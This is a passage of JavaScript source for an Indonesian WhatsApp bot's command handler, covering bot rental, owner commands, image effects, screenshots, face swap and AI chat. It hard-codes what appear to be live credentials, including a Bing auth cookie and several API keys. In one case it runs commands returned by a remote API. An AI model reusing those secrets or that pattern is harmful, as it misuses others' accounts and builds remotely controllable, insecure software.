				m.reply("Sewa bot berhasil ditambahkan!")
				await sleep(3000)
				let ceksewa = ms(_sewa.getSewaExpired(data) - Date.now())
				let teks = `*</> SEWA BOT INFO </>*

*Subscribe Info* :
- Grup : ${data.split("@")[0]}
- Expired : ${waktu.toUpperCase()}
- Countdown :
${ceksewa.days} hari, ${ceksewa.hours} jam, ${ceksewa.minutes} menit

*Benefit Info* :
- Feature : 1300++
- Management : Yes 
- Request : 1/5s
- VIP Access : No
- Grup Priority : Yes
- Protection : Yes
`
            		const contentText = {
            			text: teks,
            			contextInfo: {
            				mentionedJid: vreden.ments(teks),
            				externalAdReply: {
        					title: `GROUP SEWA 💫`,
        					previewType: "PHOTO",
        					thumbnailUrl: `https://pomf2.lain.la/f/yy6atxpc.jpg`,
        					sourceUrl: setting.tiktok
            				}
            			}
            		};
            		return vreden.sendMessage(data, contentText, {
                    			quoted: m,
                    		});
				}
				break
			case 'delsewa': {
				let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!m.isGroup) return m.warning(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
				if (!isSewa) return m.warning(`Bot tidak disewa di Grup ini`)
				sewa.splice(_sewa.getSewaPosition(m.chat), 1)
				fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
				m.reply(`Grup di hapus dari list sewa!`)
				}
				break
			case 'resetlimit': {
                const resetLimit = (newLimit) => {
                Object.keys(data).forEach(user => {
                   data[user].limit = newLimit;
                });
                m.reply("Limit pengguna direset ke " + limitCount)
                };
                resetLimit(limitCount);
                }
				break
			case 'ytcomment': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Contoh : ${prefix+command} hello world`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let avatar
					try {
						avatar = await vreden.profilePictureUrl(m.sender, "image")
					} catch {
						avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
					}
					let buffer = await getBuffer(`https://some-random-api.com/canvas/misc/youtube-comment?comment=${encodeURIComponent(text)}&avatar=${encodeURIComponent(avatar)}&username=${pushname}`)
					await vreden.sendMessage(m.chat, {
						image: buffer,
						caption: `*YouTube Comment 🍟*`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'carbon':
			case 'karbon': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				if (m.quoted) {
					tulisan = m.quoted.text
				} else {
					tulisan = text
				}
				if (!tulisan) return m.warning(`Contoh : ${prefix+command} Yahya`)
				try {
					let buffer = await CarbonifyV1(tulisan)
					await vreden.sendMessage(m.chat, {
						image: buffer,
						caption: `*Carbon Text ✨*`
					}, {
						quoted: m
					})
				} catch (error) {
					try {
						let buffer = await CarbonifyV2(tulisan)
						await vreden.sendMessage(m.chat, {
							image: buffer,
							caption: `*Carbon Api ✨*`
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
			case 'ssweb2':
			case 'ssweb': {
				if (!args[0]) return m.warning(`Gunakan dengan cara ${prefix+command} type *url web*\n\nList type:\n1. hp\n2. pc\n3. tab\n\nContoh penggunaan : ${prefix+command} hp https://bit.ly/420u6GX`)
				if (!args[1]) return m.warning(`Gunakan dengan cara ${prefix+command} type *url web*\n\nList type:\n1. hp\n2. pc\n3. tab\n\nContoh penggunaan : ${prefix+command} hp https://bit.ly/420u6GX`)
				const key = await pickRandom(["f4fd50", "f57572", "f45b80", "a8a45d", "0060ec", "b085e3"])
				if (args[0] === 'hp') {
					if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
					if (!args[1]) return m.warning(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					try {
						await vreden.sendMessage(m.chat, {
							image: {
								url: `https://api.screenshotmachine.com/?key=${key}&url=${args[1]}&device=phone&dimension=480x800&format=png&cacheLimit=0&delay=200`
							},
							caption: `*🍟 Fetching* : ${latensi.toFixed(4)}s`
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				} else
				if (args[0] === 'pc') {
					if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
					if (!args[1]) return m.warning(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					try {
						await vreden.sendMessage(m.chat, {
							image: {
								url: `https://api.screenshotmachine.com/?key=${key}&url=${args[1]}&device=desktop&dimension=1024x768&format=png&cacheLimit=0&delay=200`
							},
							caption: `*🍟 Fetching* : ${latensi.toFixed(4)}s`
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				} else
				if (args[0] === 'tab') {
					if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
					if (!args[1]) return m.warning(`Gunakan dengan cara ${prefix+command} *url web*\nContoh penggunaan : ${prefix+command} https://bit.ly/420u6GX`)
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					try {
						await vreden.sendMessage(m.chat, {
							image: {
								url: `https://api.screenshotmachine.com/?key=${key}&url=${args[1]}&device=tablet&dimension=800x1280&format=png&cacheLimit=0&delay=200`
							},
							caption: `*🍟 Fetching* : ${latensi.toFixed(4)}s`
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				} else {
					m.reply(`Mau type apa lu?\n\n- hp\n- pc\n- tab\n\nContoh:\n${prefix + command} hp https://bit.ly/420u6GX`)
				}
			}
			break
			case 'couple':
			case 'ppcp': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let random = await pickRandom(anu)
				vreden.sendMessage(m.chat, {
					image: {
						url: random.male,
					},
					caption: `Couple Male`,
				}, {
					quoted: m,
				})
				vreden.sendMessage(m.chat, {
					image: {
						url: random.female,
					},
					caption: `Couple Female`,
				}, {
					quoted: m,
				})
			}
			break
			//darkjokes
			case 'darkjokes':
			case 'darkjoke': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let darkjoke = await fetchJson(`https://www.vreden.my.id/cdn/game/darkjokes.json`)
					const dl_url = await pickRandom(darkjoke)
					await vreden.sendMessage(m.chat, {
						image: {
							url: dl_url
						},
						caption: "Tetap Tertawa Walaupun Cringe🗿"
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'meme':
			case 'memeindo': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let memeindo = await fetchJson(`https://www.vreden.my.id/cdn/game/memeindo.json`)
					const dl_url = await pickRandom(memeindo)
					vreden.sendMessage(m.chat, {
						image: {
							url: dl_url.meme
						},
						caption: `nyohhh 🗿`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'glitchtext':
			case 'writetext':
			case 'advancedglow':
			case 'typographytext':
			case 'pixelglitch':
			case 'neonglitch':
			case 'flagtext':
			case 'flag3dtext':
			case 'deletingtext':
			case 'blackpinkstyle':
			case 'glowingtext':
			case 'underwatertext':
			case 'logomaker':
			case 'cartoonstyle':
			case 'papercutstyle':
			case 'watercolortext':
			case 'effectclouds':
			case 'blackpinklogo':
			case 'gradienttext':
			case 'summerbeach':
			case 'luxurygold':
			case 'multicoloredneon':
			case 'sandsummer':
			case 'galaxywallpaper':
			case '1917style':
			case 'makingneon':
			case 'royaltext':
			case 'freecreate':
			case 'galaxystyle':
			case 'lighteffects': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *text*`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				let link
				if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
				if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
				if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
				if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
				if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
				if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
				if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
				if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
				if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
				if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
				if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
				if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
				if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
				if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
				if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
				if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
				if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
				if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
				if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
				if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
				if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
				if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
				if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
				if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
				if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
				if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
				if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
				if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
				if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
				if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
				try {
					let haldwhd = await ephoto(link, q)
					await vreden.sendMessage(m.chat, {
						image: {
							url: haldwhd
						},
						caption: `ePhoto360 Maker`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'restart': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				m.reply("Restarting...")
				await sleep(3000)
				process.exit("1")
			}
			break
			case 'upsaluran': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				try {
					if (/image/.test(mime)) {
						media = await quoted.download()
						vreden.sendMessage(idsaluran, {
							image: media,
							caption: text ? text : ""
						})
						m.reply("Berhasil Up Kesaluran")
					} else if (/video/.test(mime)) {
						media = await quoted.download()
						vreden.sendMessage(idsaluran, {
							video: media,
							caption: text ? text : ""
						})
						m.reply("Berhasil Up Kesaluran")
					} else {
						if (!text) return m.warning("*Masukan Text Atau Media!*")
						vreden.sendMessage(idsaluran, {
							text: text
						})
						m.reply("Berhasil Up Kesaluran")
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'addowner': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag*`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				try {
					if (users) {
						ownerNumber.push(users)
						fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
						m.reply(`Sukses`)
					} else {
						m.reply(`Gunakan dengan cara ${prefix + command} *@tag*`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'delowner': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag/jid*`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				try {
					if (users) {
						if (!ownerNumber.includes(users)) return m.warning(`Dia bukan owner`)
						ownerNumber.splice(ownerNumber.indexOf(users, 1))
						m.reply(`Sukses`)
					} else {
						m.reply(`Gunakan dengan cara ${prefix + command} *@tag*`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'bingimage2':
			case 'bingimg2': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning('Masukan Gambarannya\nContoh:\n1girl, with glasses, in beach')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const {
						BingApi
					} = require('./lib/bing-image.js');
					const bingApi = new BingApi("1L7I8Ylg6-hLzw5WmRzXcnng0P8tqeFd4p4FSESiEDeRNrBA4c3gj9gF7UZfcYk6TKE2bmQYOJb_Rv4SH8f0XbGktxezmCJpdMdxwSfkrR3c4Rjn7hx_zct9TBtCbSL_Br45cNeXkWmWCO0ZmmPrwWzLlaJdwKoXPtrVSEEPjiAukA9BPCz19o2II2XDP8JuJbl3OR2O8cnwKpGSWNZmp6rZhtcdZskY4VPZlV2E0zn4");
					const imagesUrls = await bingApi.createImages(text, false);
					const totalCount = imagesUrls.length;
					const credits = await bingApi.getCredits();

					if (totalCount > 0) {
						for (let i = 0; i < totalCount; i++) {
							try {
								await new Promise(resolve => setTimeout(resolve, i * 6000));
								vreden.sendMessage(m.chat, {
									image: {
										url: imagesUrls[i]
									},
									caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}`
								}, {
									quoted: fchannel
								});
							} catch (error) {
								console.error(`Error sending file: ${error.message}`);
								await m.reply(`Failed to send image *(${i + 1}/${totalCount})*`);
							}
						}
					} else {
						await m.reply('No images found after filtering.');
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'bingimage':
			case 'bingimg': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning('Masukan Gambarannya\nContoh:\n1girl, with glasses, in beach')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let img = await fetchJson(`https://anabot.my.id/api/ai/bingAi?prompt=${text}&apikey=DdUFIJY3sIGZW0g`)
					let imgs = img.image
					let c = 0
					for (let ims of img.image) {
						if (c == 0) await vreden.sendMessage(m.chat, {
							image: {
								url: ims
							},
							caption: `*Bing Generator ✨*\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}`
						}, {
							quoted: m
						})
						else await vreden.sendMessage(m.sender, {
							image: {
								url: ims
							}
						}, {
							quoted: m
						})
						c += 1
						await sleep(2000)
					}
				} catch (error) {
					try {
						let img = await fetchJson(`https://anabot.my.id/api/ai/bingAi?prompt=${text}&apikey=uhnKkdVjsVeICuI`)
						let imgs = img.image
						let c = 0
						for (let ims of img.image) {
							if (c == 0) await vreden.sendMessage(m.chat, {
								image: {
									url: ims
								},
								caption: `*Bing Generator ✨*\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}`
							}, {
								quoted: m
							})
							else await vreden.sendMessage(m.sender, {
								image: {
									url: ims
								}
							}, {
								quoted: m
							})
							c += 1
							await sleep(2000)
						}
					} catch (error) {
						try {
							const {
								BingApi
							} = require('./lib/bing-image.js');
							const bingApi = new BingApi("1L7I8Ylg6-hLzw5WmRzXcnng0P8tqeFd4p4FSESiEDeRNrBA4c3gj9gF7UZfcYk6TKE2bmQYOJb_Rv4SH8f0XbGktxezmCJpdMdxwSfkrR3c4Rjn7hx_zct9TBtCbSL_Br45cNeXkWmWCO0ZmmPrwWzLlaJdwKoXPtrVSEEPjiAukA9BPCz19o2II2XDP8JuJbl3OR2O8cnwKpGSWNZmp6rZhtcdZskY4VPZlV2E0zn4");
							const imagesUrls = await bingApi.createImages(text, false);
							const totalCount = imagesUrls.length;
							const credits = await bingApi.getCredits();

							if (totalCount > 0) {
								for (let i = 0; i < totalCount; i++) {
									try {
										await new Promise(resolve => setTimeout(resolve, i * 6000));
										vreden.sendMessage(m.chat, {
											image: {
												url: imagesUrls[i]
											},
											caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}`
										}, {
											quoted: fchannel
										});
									} catch (error) {
										console.error(`Error sending file: ${error.message}`);
										await m.reply(`Failed to send image *(${i + 1}/${totalCount})*`);
									}
								}
							} else {
								await m.reply('No images found after filtering.');
							}
						} catch (error) {
							await m.errorReport(util.format(error), command)
						}
					}
				}
			}
			break
			case 'aidraw':
			case 'aidrawing':
			case 'image':
			case 'img':
			case 'chatgptimg':
			case 'openaiimg':
			case 'aiimg': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning('Masukan Gambarannya\nContoh:\n1 girl, with glasses, in beach')
				if (budy.match(`nigga|sexy|colmek|coli|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return m.tolak('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const params = {
						model: "dreamlike-photoreal-2.0.safetensors [fdcf65e7]",
						prompt: text,
						style_preset: "3d-model",
						steps: 20,
						cfg_scale: 7,
						seed: -1,
						upscale: true,
						sampler: "DPM++ 2M Karras",
						width: 1024,
						height: 1024
					}
					const generate = await txt2img(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `AI Generator Image🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'faceswap': { //Fix Qioo
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!args[0]) return m.warning(`*Masukan Link Source!*\n\nCara:\n${prefix + command} urlsource urltarget\n\nContoh:\n${prefix + command} https://telegra.ph/file/dfe154148659e4a714de7.jpg https://telegra.ph/file/a910de0c7d860c7070100.jpg`)
				if (!args[1]) return m.warning(`*Masukan Link Target!*\n\nCara:\n${prefix + command} urlsource urltarget\n\nContoh:\n${prefix + command} https://telegra.ph/file/dfe154148659e4a714de7.jpg https://telegra.ph/file/a910de0c7d860c7070100.jpg`)
				if (!isUrl(args[0])) return m.warning(`*Masukan Link Source Muka Yang Benar!*\n\nCara:\n${prefix + command} urlsource urltarget\n\nContoh:\n${prefix + command} https://telegra.ph/file/dfe154148659e4a714de7.jpg https://telegra.ph/file/a910de0c7d860c7070100.jpg`)
				if (!isUrl(args[1])) return m.warning(`*Masukan Link Muka Target Yang Benar!*\n\nCara:\n${prefix + command} urlsource urltarget\n\nContoh:\n${prefix + command} https://telegra.ph/file/dfe154148659e4a714de7.jpg https://telegra.ph/file/a910de0c7d860c7070100.jpg`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const params = {
						sourceUrl: args[0],
						targetUrl: args[1]
					};
					const generate = await faceSwap(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `Image Effect FaceSwap 🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'img2img': { //Fix Qioo
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning(`Balas Image Dengan Caption ${prefix + command}`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				const input_data = await listModels();
				const samplr = await listSampler();
				const styler = await getModels();
				let media = await vreden.downloadAndSaveMediaMessage(quoted);
				let link = await pomfCDN(media);
				let [urutan, tema] = text.split("|")
				try {
					let data = input_data.map((item, index) => ({
						title: item.replace(/[_-]/g, ' ').replace(/\..*/, ''),
						id: item
					}));
					if (!urutan) return m.reply("Masukan Models!\n*Contoh:*\n.img2img [nomor]|[query]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
					if (isNaN(urutan)) return m.reply("Masukan Models Yang Valid!\n*Contoh:*\n.img2img [nomor]|[query]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
					if (urutan > data.length) return m.reply("Masukan Models Yang Valid!\n*Contoh:*\n.img2img [nomor]|[query]\n\n*Pilih angka yg ada*\n" + data.map((item, index) => `*${index + 1}.* ${item.title}`).join("\n"))
					if (!tema) return m.warning("*Masukan Teks!*!\n\nContoh:\n.img2img [nomor]|[query]")
					await vreden.sendMessage(m.chat, {
						react: {
							text: "⏱️",
							key: m.key,
						}
					})
					let out = data[urutan - 1].id
					let imgdata = media.toString('base64')
					const samp = await pickRandom(samplr)
					const sty = await pickRandom(styler[10].enum)
					const params = {
						imageUrl: link,
						imageData: imgdata,
						model: out,
						prompt: tema,
						denoising_strength: 0.7,
						style_preset: sty,
						steps: 20,
						cfg_scale: 7,
						upscale: true,
						sampler: samp,
						width: 1024,
						height: 1024
					};
					const generate = await transfrom(params);
					await sleep(30000)
					const result = await getJobs(generate.job);
					await vreden.sendMessage(m.chat, {
						image: {
							url: result.imageUrl
						},
						caption: `Image Effect ${out} 🍟`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'qioo': {
				if (args[0] === "-start") {
					if (usersdb[m.sender].qioo) return m.reply(`Udah on`)
					usersdb[m.sender].qioo = true
					m.sendForward("*[ </> ]* Berhasil Diaktifkan")
				} else if (args[0] === "-stop") {
					if (!usersdb[m.sender].qioo) return m.reply(`Udah off`)
					usersdb[m.sender].qioo = false
					usersdb[m.sender].caiSesi = ""
					m.sendForward(`Bye byee ${usersdb[m.sender].nama}👋`)
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} -start\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} -stop\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'bot':
			case 'vreden': {
				const uploadFile = {
					upload: vreden.waUploadToServer
				};
				var imageMessage = await prepareWAMessageMedia({
						image: {
							url: "https://telegra.ph/file/eb4abdae5dbb792e3e4d9.jpg"
						},
					},
					uploadFile,
				);
				const product = {
					productImage: imageMessage.imageMessage,
					productId: "7066960336725723",
					title: "I'm Here Mastahhh 🍟",
					description: "Nyari Apa Dek?",
					currencyCode: "IDR",
					priceAmount1000: "30000000",
					productImageCount: 1,
				};
				const productData = {
					product: product,
					businessOwnerJid: "6287824695047@s.whatsapp.net",
				};
				const productMessage = {
					productMessage: productData
				};
				var response = await generateWAMessageFromContent(
					m.chat,
					proto.Message.fromObject(productMessage),
					m.quoted && m.quoted.fromMe ? {
						contextInfo: {
							...m.msg.contextInfo
						}
					} : {
						quoted: m
					},
				);
				await vreden.relayMessage(m.chat, response.message, {
					messageId: response.key.id,
				});
			}
			break
			case 'luminai': {
				if (!text) return m.reply('iya kak?');
				try {
					if (quoted && /image/.test(quoted.mimetype)) {
						let media = await quoted.download()
						let respons = await luminaigambar(text, m.sender, true, media)
						m.sendForward(respons);
					} else {
						let respons = await luminaitext(text, m.sender, true)
						m.sendForward(respons);
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ai':
			case 'chatgpt': {
				if (!text) return m.reply('Iyaa kenafaa?')
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					vreden.chatgpt = vreden.chatgpt ? vreden.chatgpt : {}
					vreden.chatgpt[m.sender] = vreden.chatgpt[m.sender] ? vreden.chatgpt[m.sender] : []
					if (!/image/.test(mime)) {
					vreden.chatgpt[m.sender].push({
						id: m.sender,
						content: text,
						role: 'user'
					})
					let gpt = await blackboxGPT(vreden.chatgpt[m.sender])
					if (!gpt.isCode) {
					m.sendForward(gpt.text)
					} else {
					let button = []
					for (let i = 0; i < gpt.sniplength; i++) {
					button.push({
						"name": "cta_copy",
						"buttonParamsJson": `{
  display_text: "Salin Code ${i + 1}",
  id: "123456789",
  copy_code: "${gpt.snipheet[i]}"
}`
					})
					}
					await vreden.sendButtonImage(m.chat, {
			    		url: "https://pomf2.lain.la/f/c7b4qq2e.jpg"
		    		}, button, gpt.text, footer, m)
					}
					let time = new Date()
					let timeAt = time.toISOString()
					vreden.chatgpt[m.sender].push({
						id: m.sender.split("@")[0],
						createdAt: timeAt,
						content: gpt.text,
						role: "assistant"
					})
					} else if (/image/.test(mime)) {
					let path = await vreden.downloadAndSaveMediaMessage(quoted);
					let img = await blackboxIMG(path, m.sender.split("@")[0], text)
					let buffer = fs.readFileSync(path)
					let base64 = Buffer.from(buffer)
					let Base64 = base64.toString("base64")
					vreden.chatgpt[m.sender].push({
					id: m.sender.split("@")[0],
					content: img,
					role: "user",
					data: {
					    imageBase64: "data:image/jpeg;base64," + Base64,
					    fileText: img
					    }
					})
					let gpt = await blackboxGPT(vreden.chatgpt[m.sender])
					if (!gpt.isCode) {
					m.sendForward(gpt.text)
					} else {
					let button = []
					for (let i = 0; i < gpt.sniplength; i++) {
					button.push({
						"name": "cta_copy",
						"buttonParamsJson": `{
  display_text: "Salin Code ${i + 1}",
  id: "123456789",
  copy_code: "${gpt.snipheet[i]}"
}`
					})
					}
					await vreden.sendButtonImage(m.chat, {
			    		url: "https://pomf2.lain.la/f/c7b4qq2e.jpg"
				    }, button, gpt.text, footer, m)
					}
					let time = new Date()
					let timeAt = time.toISOString()
					vreden.chatgpt[m.sender].push({
						id: m.sender.split("@")[0],
						createdAt: timeAt,
						content: gpt.text,
						role: "assistant"
					})
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'simi':
			case 'simisimi':
			case 'sim':
			case 'gpt': {
				try {
					if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
					if (!text) return m.reply('Iyaa kenafaa?')
					let result = await fetchJson(`https://api.vreden.my.id/api/simi?query=${encodeURIComponent(text)}&lang=id`)
					const gpt = result.result
					m.sendForward(gpt)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ai2':
			case 'chatgpt2': {
				if (!text) return m.reply('Iyaa kenafaa?')
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					const autoaii = await fetchJson(`https://api.vreden.my.id/api/qioo2?query=${encodeURIComponent(text)}&username=${m.sender}`)
					const aireply = autoaii.result
					if (autoaii.command.status) {
						vreden.appenTextMessage(autoaii.command.cmd, chatUpdate)
						await sleep(500)
